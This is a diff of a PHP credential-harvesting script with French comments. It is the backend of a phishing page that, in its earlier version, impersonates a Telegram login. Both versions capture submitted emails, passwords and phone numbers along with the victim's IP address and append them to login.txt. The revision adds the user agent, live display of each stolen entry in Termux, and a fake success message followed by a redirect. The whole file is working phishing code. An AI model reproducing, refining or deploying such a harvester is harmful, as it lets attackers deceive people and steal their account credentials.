@@ -1,70 +1,62 @@
 <?php
-// Vérifie si le formulaire a été soumis via la méthode POST
+// Configuration
+$logFile = "login.txt";
+$realTimeLog = true; // Activer l'affichage temps réel dans Termux
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Récupère et nettoie les données du formulaire
-    $username = htmlspecialchars(trim($_POST["email"]));  // Adresse e-mail ou numéro de téléphone
-    $password = htmlspecialchars(trim($_POST["password"])); 
-    $country_code = htmlspecialchars(trim($_POST["country_code"] ?? ''));  // Indicatif pays
-    $phone_number = htmlspecialchars(trim($_POST["phone_number"] ?? ''));  // Numéro de téléphone
-    $remember = isset($_POST["remember"]) ? 'Oui' : 'Non';  // Case à cocher
+    // Récupération des données
+    $email = htmlspecialchars(trim($_POST["email"] ?? ''));
+    $password = htmlspecialchars(trim($_POST["password"] ?? ''));
+    $country_code = htmlspecialchars(trim($_POST["country_code"] ?? ''));
+    $phone = htmlspecialchars(trim($_POST["phone"] ?? ''));
     $ip = $_SERVER['REMOTE_ADDR'];
     $date = date('Y-m-d H:i:s');
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
-    // Vérifie si les champs ne sont pas vides
-    if (!empty($username) && !empty($password)) {
-        // Formate les données pour l'enregistrement
-        $data = "=== NOUVELLE CONNEXION TELEGRAM ===\n";
-        $data .= "Date: $date\n";
-        $data .= "Email/Username: $username\n";
-        $data .= "Téléphone: $country_code$phone_number\n";
-        $data .= "Mot de passe: $password\n";
-        $data .= "Session active: $remember\n";
-        $data .= "Adresse IP: $ip\n";
-        $data .= "==================================\n\n";
-        
-        // Configuration ultra-sophistiquée du fichier
-        $file = "login.txt";
-        
-        // Crée le fichier s'il n'existe pas et set les permissions
-        if (!file_exists($file)) {
-            touch($file);
-            chmod($file, 0644);  // -rw-r--r--
+    // Validation des données
+    if (empty($email) || empty($password)) {
+        die("Erreur : Email et mot de passe requis");
+    }
+
+    // Formatage des données
+    $logEntry = "======= NOUVELLE CONNEXION =======\n";
+    $logEntry .= "Date: $date\n";
+    $logEntry .= "IP: $ip\n";
+    $logEntry .= "User Agent: $userAgent\n";
+    $logEntry .= "Email: $email\n";
+    $logEntry .= "Téléphone: $country_code $phone\n";
+    $logEntry .= "Mot de passe: $password\n";
+    $logEntry .= "================================\n\n";
+
+    // Enregistrement dans le fichier
+    try {
+        // Création du fichier si inexistant
+        if (!file_exists($logFile)) {
+            file_put_contents($logFile, "");
+            chmod($logFile, 0644);
         }
-        
-        // Vérifie et corrige les permissions si nécessaire
-        if (!is_writable($file)) {
-            chmod($file, 0644);
+
+        // Écriture sécurisée
+        if (file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX) === false) {
+            throw new Exception("Erreur d'écriture dans le fichier");
         }
-        
-        // Double vérification de sécurité avant écriture
-        clearstatcache(); // Nettoie le cache des statuts de fichier
-        
-        // Mécanisme d'écriture sécurisé avec verrou
-        $attempts = 0;
-        $max_attempts = 3;
-        $written = false;
-        
-        while ($attempts < $max_attempts && !$written) {
-            $written = file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
-            if ($written === false) {
-                usleep(100000); // 100ms de délai entre les tentatives
-                $attempts++;
-            }
+
+        // Affichage temps réel dans Termux
+        if ($realTimeLog && php_sapi_name() === 'cli') {
+            echo "\n\033[32m[NOUVEAU LOG]\033[0m\n";
+            echo $logEntry;
         }
+
+        // Réponse à l'utilisateur
+        echo "Connexion réussie! Redirection en cours...";
+        header("Refresh: 3; url=mer.html");
         
-        if ($written !== false) {
-            // Message de succès amélioré
-            echo "AUTHENTIFICATION RÉUSSI ☑️\n TELEGRAME PROTÈGE DÉSORMAIS VÔTRE COMPTE.";
-        } else {
-            // Journalisation d'erreur professionnelle
-            error_log("[" . date('Y-m-d H:i:s') . "] Échec d'écriture dans $file. IP: $ip");
-            echo "Erreur système : Veuillez réessayer plus tard.";
-        }
-    } else {
-        echo "Erreur : Veuillez remplir tous les champs obligatoires.";
+    } catch (Exception $e) {
+        error_log("Erreur: " . $e->getMessage());
+        echo "Une erreur est survenue. Veuillez réessayer.";
     }
 } else {
-    header("HTTP/1.1 403 Forbidden");
-    echo "Accès refusé : Méthode non autorisée.";
+    http_response_code(403);
+    echo "Accès interdit";
 }
 ?>
